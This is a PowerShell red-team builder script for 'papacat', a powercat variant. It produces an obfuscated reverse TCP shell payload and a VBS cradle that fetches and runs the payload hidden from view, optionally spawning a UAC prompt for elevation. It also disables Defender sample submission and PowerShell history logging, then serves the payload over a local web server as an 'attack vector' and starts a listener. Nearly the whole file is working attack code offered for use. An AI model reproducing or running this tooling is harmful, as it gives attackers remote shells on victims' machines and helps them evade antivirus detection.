<#
.SYNOPSIS
   Builder - papacat Automation - Obfuscation

   Author: @r00t-3xp10it
   Credits: @besimorhino (powe`rcat)
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: papacat {auto-download}
   Optional Dependencies: http.server {python3}
   PS cmdlet Dev version: v2.2.12

.DESCRIPTION
   This cmdlet automates the creation of papacat (power`cat) obfuscated client. 
   This cmdlet creates update.vbs crandle that downloads\executes revshell.ps1
   from attacker webserver, and starts a handler to wait for client connection.

.NOTES
   Parameter -action 'rawcat' will use papacat.ps1 as client (payload) while
   parameter -action 'obfuscate' creates a new obfuscated client (payload).

   Parameter -elevate 'true' makes crandle spawn a UAC gui to run elevated.
   Parameter -encode 'true' encode\decode tcp data flow between client and
   server if invoke together with -action 'rawcat' parameter declaration.

   Parameter -force 'true' disables defender samples submition local\remote.
   Remark: Disable windows defender SampleSubmition requires admin privs.
   Remark: Windows defender warn users that sample submition is disabled?

.Parameter Action
   Accepts arguments: rawcat, obfuscate (default: obfuscate)

.Parameter ClientName
   Reverse tcp shell name (default: revshell)

.Parameter VbsName
   Vbscript download crandle name (default: update)

.Parameter Execute
   The name of the process to start (default: cmd.exe)

.Parameter TimeOut
   Seconds to wait before giving up on handler (default: 120)

.Parameter serverPort
   Python3 http.server port number (default: 8080)

.Parameter PayloadPort
   Reverse tcp shell port number (default: 666)

.Parameter Force
   Disable AV sample submition (default: false)

.Parameter Encode
   Encode\Decode tcp data flow (default: false)
   If invoked together with -action 'rawcat'

.Parameter Elevate
   Spawn UAC gui to run elevated? (default: false)

.EXAMPLE
   PS C:\> Get-Help .\Builder.ps1 -full
   Access full cmdlet comment based help

.EXAMPLE
   PS C:\> .\Builder.ps1 -action "obfuscate" -ClientName "revshell" -PayloadPort "4444" -VbsName "Update"
   Creates a new obfuscated client (revshell.ps1) with '4444' payload port and Update.vbs download crandle.

.EXAMPLE
   PS C:\> .\Builder.ps1 -action "obfuscate" -ClientName "revshell" -PayloadPort "666" -Execute "powershell.exe"
   Creates a new obfuscated client (revshell.ps1) with '666' payload port that executes 'powershell' as parent.

.EXAMPLE
   PS C:\> .\Builder.ps1 -action "rawcat" -PayloadPort "666" -serverPort "8087" -TimeOut "240"
   Use papacat.ps1 as client (payload), with '666' payload port and python3 http.server '8087'
   port number, wait for '240' seconds before giving up on listening ( auto-exit handler )

.EXAMPLE
   PS C:\> .\Builder.ps1 -action "rawcat" -force "true" -encode 'true' -VbsName "mycat"
   Use papacat.ps1 as client (payload), disable av samples submition, encode\decode tcp
   data flow between client\server and creates mycat.vbs download\execute crandle.

.EXAMPLE
   PS C:\> .\Builder.ps1 -action "obfuscate" -force "true" -VbsName "mycat" -Elevate "true"
   Creates a new obfuscated client (revshell.ps1), disable av samples submition and creates
   mycat.vbs download crandle that spawn UAC gui to run crandle\client with elevated privs.

.INPUTS
   None. You cannot pipe objects into Builder.ps1

.OUTPUTS
   * papacat reverse tcp shell builder.
   * using webserver to deliver payload
   + created: 'C:\Users\pedro\Coding\papacat_rev_shell\Update.vbs'
   * download papacat from github repository.
   * Generate cmd.exe client (payload) obfucated
   + created: 'C:\Users\pedro\Coding\papacat_rev_shell\revshell.ps1'

     ¤ Attack Vector: http://192.168.1.72:8080/Update.zip ¤

   Starting papacat handler.
   VERBOSE: Set Stream 1: TCP
   VERBOSE: Set Stream 2: Console
   VERBOSE: Setting up Stream 1...
   VERBOSE: Listening on [0.0.0.0] (port 666)

.LINK
   https://github.com/r00t-3xp10it/redpill/tree/main/utils/papacat_rev_shell
   https://gist.github.com/r00t-3xp10it/80fa09009f9e56302a33ec377e507295?permalink_comment_id=4078577#gistcomment-4078577
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$ClientName="revshell",
   [string]$Action="obfuscate",
   [string]$Execute="cmd.exe",
   [string]$VbsName="Update",
   [string]$Elevate="false",
   [int]$serverPort='8080',
   [int]$PayloadPort='666',
   [string]$Encode="false",
   [string]$Force="false",
   [int]$timeout='120'
)


#Variable declarations
$ClientRawn = $ClientName
$VbsName = "$VbsName" + ".vbs" -Join ''
$CmdletVersion = "v2.2.12" #CmdLet version
$ErrorActionPreference = "SilentlyContinue"
$ClientName = "$ClientName" + ".ps1" -Join ''
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$Local_Host = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]
$host.UI.RawUI.WindowTitle = "@papacat $CmdletVersion {SSA@RedTeam}"

$Banner = @"

      * pow`er`cat obfuscated version {$CmdletVersion} *
██████╗  █████╗ ██████╗  █████╗  ██████╗ █████╗ ████████╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝
██████╔╝███████║██████╔╝███████║██║     ███████║   ██║   
██╔═══╝ ██╔══██║██╔═══╝ ██╔══██║██║     ██╔══██║   ██║   
██║     ██║  ██║██║     ██║  ██║╚██████╗██║  ██║   ██║   
╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝
                         
"@;
Clear-Host;
Write-Host $Banner -ForegroundColor Blue
Write-Host "* papacat reverse tcp shell builder." -ForegroundColor Green
Start-Sleep -Milliseconds 600

If($Encode -ieq "True" -and $Action -ieq "obfuscate")
{
   write-host "* error: -encode 'true' requires -action 'rawcat'" -ForegroundColor Red -BackgroundColor Black
   Start-Sleep -Milliseconds 600
}


$Changed = $null
If($Force -ieq "True")
{

   <#
   .SYNOPSIS
     Author: @r00t-3xp10it
     Helper - Disable AV (defender) sample submition.

   .NOTES
      Parameter -force 'true' disable AV samples submition (default: false)
      on attacker PC (local) and in target PC trough crandle exec (remote).

      Remark: Disable windows defender SampleSubmition requires admin privs.
      Remark: Windows defender warn users that sample submition is disabled.
   #>

   #Check current proccess privileges owned!
   $AdminToken = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
   If((Get-MpPreference -EA SilentlyContinue).SubmitSamplesConsent -ne 0)
   {
      If($AdminToken)
      {
         $Changed = "True" #Administrator privileges owned!
         Set-MpPreference -SubmitSamplesConsent 0 -Force|Out-Null
         Write-Host "* current process running under admin token." -ForegroundColor Green
         Write-Host "  => disable anti-virus (defender) sample submition." -ForegroundColor Yellow
      }
      Else
      {
         $Changed = "False" #UserLand privileges owned!
         Write-Host "*" -ForegroundColor Red -NoNewline;
         Write-Host " current process running under userland token." -ForegroundColor DarkGray
         Write-Host "  => admin privs required to disable AV sample submition." -ForegroundColor Yellow      
      }
   }
}


If($timeout -lt 60)
{
   #wait connection timmer
   [int]$timeout = 120 #Default value
}
If($Action -ieq "rawcat")
{
   #Raw papacat as client
   $ClientRawn = "papacat"
}


## Crandlers { download \ execution }
# Download client from attacker webserver vbscript
$Obfuscation = $Local_Host.replace('.','i0:k')    # p://192i0:k168i0:k1i0:k72
$VbsCrandle = @("' Author: @r00t-3xp10it (ssa)
' Application: papacat download crandle
' Description:
'   This VBS will download $ClientName (rev tcp shell) from attacker webserver
'   imports module and executes the module in a hidden console. ( background )
' ---

dIm Buffer,ps
Buffer=`"p://$Obfuscation`"
ps=rEpLaCe(Buffer, `"i0:k`", `".`")

set ObjConsole = CreateObject(`"Wscript.Shell`")
ObjConsole.Run(`"powershell.exe cd `$Env:TMP;iwr -Uri htt`"+ps+`":${serverPort}/$ClientName -OutFile $ClientName;Import-Module -Name .\$ClientName -Force;$ClientRawn -c $Local_Host -e $Execute -p $PayloadPort -t $timeout`"), 0
}")


#Execute client locally vbscript
$VbsExecution = @("' Author: @r00t-3xp10it (ssa)
' Application: papacat execution crandle
' Description:
'   This VBS imports $ClientName and executes $ClientName in a hidden console.
' ---

dIm currDir
Set fso = CreateObject(`"Scripting.FileSystemObject`")
currDir = fso.GetParentFolderName(Wscript.ScriptFullName)

set ObjConsole = CreateObject(`"Wscript.Shell`")
ObjConsole.Run(`"powershell.exe cd '`"+currDir+`"';Import-Module -Name .\$ClientName -Force;$ClientRawn -c $Local_Host -e $Execute -p $PayloadPort -t $timeout`"), 0
}")


## Disable AV (defender) sample submition VBS function.
# Requires the Vbscript to be executed with admin privs
$SamplesSubmition = @("On Error Resume Next
key = CreateObject(`"WScript.Shell`").RegRead(`"HKEY_USERS\S-1-5-19\Environment\TEMP`")
If err.number = 0 Then
    set ObjTerminal = CreateObject(`"Wscript.Shell`")
    ObjTerminal.Run(`"powershell.exe Set-MpPreference -SubmitSamplesConsent 0 -Force`"), 0
End If")


## Make crandle spawm a UAC gui to be abble to
# to run crandle\client within an elevated context.
$AutoElevation = @("'VBS-Auto-Elevation function
If WScript.Arguments.length = 0 Then
   Set objShell = CreateObject(`"Shell.Application`")
   objShell.ShellExecute `"wscript.exe`", Chr(34) & _
      WScript.ScriptFullName & Chr(34) & `" uac`", `"`", `"runas`", 1
Else")


$Python_version = $null
try{#Check Attacker python version (http.server)
   $Python_version = python -V|Select-String "3."
}catch{}


If($Python_version)
{
   Write-Host "*" -ForegroundColor Green -NoNewline;
   Write-Host " using webserver to deliver payload" -ForegroundColor DarkGray
   Start-Sleep -Milliseconds 500

   #Write the vbs file on disk
   Write-Host "+" -ForegroundColor Yellow -NoNewline;
   echo $VbsCrandle|Out-File "$VbsName" -Encoding string -Force
   Write-Host " created: '$pwd\$VbsName'" -ForegroundColor DarkGray
   Start-Sleep -Milliseconds 600

   If($Force -ieq "True")
   {
      Write-Host "  => vbs: disable av samples submition." -ForegroundColor Yellow
      ((Get-Content -Path $VbsName -Raw) -Replace "' ---","' ---`n`n$SamplesSubmition")|Set-Content -Path $VbsName
   }
   If($Elevate -ieq "True")
   {
      Write-Host "  => vbs: auto-elevate client privileges." -ForegroundColor Yellow
      Write-Host "     inf:" -ForegroundColor Green -NoNewline;
      Write-Host " upload $ClientName to %tmp% .." -ForegroundColor Blue;
      ((Get-Content -Path $VbsName -Raw) -Replace "' ---","' ---`n`n$AutoElevation")|Set-Content -Path $VbsName
      ((Get-Content -Path $VbsName -Raw) -Replace "}","End If`n}")|Set-Content -Path $VbsName 
   }
}
Else
{
   Write-Host "*" -ForegroundColor Red -NoNewline;
   Write-Host " Error: webserver not found. (manual execution)" -ForegroundColor Blue
   Start-Sleep -Milliseconds 500

   #Write the vbs file on disk
   Write-Host "+" -ForegroundColor Yellow -NoNewline;
   echo $VbsExecution|Out-File "$VbsName" -Encoding string -Force
   Write-Host " created: '$pwd\$VbsName'" -ForegroundColor DarkGray
   Start-Sleep -Milliseconds 600

   If($Force -ieq "True")
   {
      Write-Host "  => vbs: disable av samples submition." -ForegroundColor Yellow
      ((Get-Content -Path $VbsName -Raw) -Replace "' ---","' ---`n`n$SamplesSubmition")|Set-Content -Path $VbsName
   }
   If($Elevate -ieq "True")
   {
      Write-Host "  => vbs: auto-elevate client privileges." -ForegroundColor Yellow
      ((Get-Content -Path $VbsName -Raw) -Replace "' ---","' ---`n`n$AutoElevation")|Set-Content -Path $VbsName
      ((Get-Content -Path $VbsName -Raw) -Replace "}","End If`n}")|Set-Content -Path $VbsName
      Start-Sleep -Milliseconds 600
   }
}


#Download papacat from redpill repository
Write-Host "*" -ForegroundColor Green -NoNewline;
Write-Host " download papacat from github repository." -ForegroundColor DarkGray
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/papacat_rev_shell/papacat.ps1" -OutFile "papacat.ps1"|Unblock-File
Start-Sleep -Milliseconds 300


Write-Host "*" -ForegroundColor Green -NoNewline;
Write-Host " Generate $Execute client (payload)" -ForegroundColor DarkGray
If($Action -ieq "rawcat")
{
   If($Encode -ieq "True")
   {
      #Encode Client tcp data \ Decode tcp data in server
      Write-Host "  => client: encode tcp data flow between channels." -ForegroundColor Yellow
      ((Get-Content -Path papacat.ps1 -Raw) -Replace "#FuckingData","`$Data")|Set-Content -Path papacat.ps1
   }

   Import-Module -Name .\papacat.ps1 -Force
   #Generate cmd client (payload) raw format
   Copy-Item -Path "papacat.ps1" -Destination "$ClientName" -Force
}
Else
{
   Import-Module -Name .\papacat.ps1 -Force
   #Generate cmd client (payload) obfucated
   papacat -c $Local_Host -e $Execute -p $PayloadPort -t $timeout -g > $ClientName
}


Start-Sleep -Milliseconds 500
If(Test-Path -Path "$ClientName" -EA SilentlyContinue)
{
   Write-Host "+" -ForegroundColor Yellow -NoNewline;
   #replace - Main @('192.168.1.72',$False,666,120) @('cmd.exe')
   Write-Host " created: '$pwd\$ClientName'" -ForegroundColor DarkGray
   ((Get-Content -Path $ClientName -Raw) -Replace "Main @\('$Local_Host'","`$Ob = `"$FirstRange`"+`"$SeconRange`"+`"$TrithRange`" -Join ''`nMain @(`$Ob")|Set-Content -Path $ClientName
}
Else
{
   Write-Host "*" -ForegroundColor Red -NoNewline;
   Write-Host " fail to create: '$pwd\$ClientName' [" -ForegroundColor DarkGray -NoNewline;
   Write-Host "abort" -ForegroundColor Red -NoNewline;
   Write-Host "]`n" -ForegroundColor DarkGray
   exit #Exit Builder
}


If($Python_version)
{
   
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - python3 http.server function
   #>

   $RawNam = $VbsName -replace '.vbs',''
   $APACHE = "$Env:LocalAppData\webroot"
   If(Test-Path -Path "$APACHE" -EA SilentlyContinue)
   {
      Remove-Item -Path "$APACHE" -EA SilentlyContinue -Recurse -Force
   }

   #Create new python3 http.server 'webroot' directory
   New-Item -Path "$APACHE" -ItemType Directory -Force|Out-Null

   #Compress VBS + client and port the ZIP archive to 'webroot' directory!
   Copy-Item -Path "$ClientName" -Destination "$APACHE\$ClientName" -Force
   Compress-Archive -LiteralPath "$VbsName" -DestinationPath "$APACHE\$RawNam.zip" -Force

   #Start python3 http.server webserver in a diferent process (detach from this process)
   Start-Process powershell.exe "write-host `"[http.server] Close this Terminal After receving the connection back in papacat ..`" -ForeGroundColor red -BackGroundColor Black;cd $APACHE;python -m http.server $serverPort --bind $Local_Host"

   Write-Host "`n  " -NoNewline; #Attack Vector Uri
   Write-Host "¤ Attack Vector: http://${Local_Host}:${serverPort}/${RawNam}.zip ¤" -ForeGroundColor Black -BackGroundColor white;

}
Else
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Manual delivery\execution function
   #>

   Start-Sleep -Milliseconds 500
   Write-Host "`n  ---------------------------------------------------------------"
   Write-Host "  Manual execute $VbsName to execute $ClientName in background"
   Write-Host "  ---------------------------------------------------------------"
   write-host "* Install python3 (http.server) to deliver payloads under LAN" -ForegroundColor Yellow;
}


Start-Sleep -Seconds 2
#Start handler ( listenner )
Write-Host "`nStarting papacat handler." -ForegroundColor Green
Start-Sleep -Milliseconds 500;papacat -l -p $PayloadPort -t $timeout -v


#Cleanning
Start-Sleep -Milliseconds 500
Remove-Item -Path "$pwd\$VbsName" -EA SilentlyContinue -Force
Remove-Item -Path "$pwd\$ClientName" -EA SilentlyContinue -Force
Remove-Item -Path "$pwd\papacat.ps1" -EA SilentlyContinue -Force
Remove-Item -Path "$APACHE" -EA SilentlyContinue -Recurse -Force


If($Changed -ieq "True")
{

   <#
   .SYNOPSIS
     Author: @r00t-3xp10it
     Helper - Enable AV (defender) sample submition again.
   #>

   #Check AV MpPreference samplesConsent value!
   If((Get-MpPreference -EA SilentlyContinue).SubmitSamplesConsent -ne 1)
   {
      #Never Send: Enable AV sample submition
      Set-MpPreference -SubmitSamplesConsent 1 -Force|Out-Null
      Write-Host "* enable anti-virus sample submition again.`n" -ForegroundColor Green
   }
}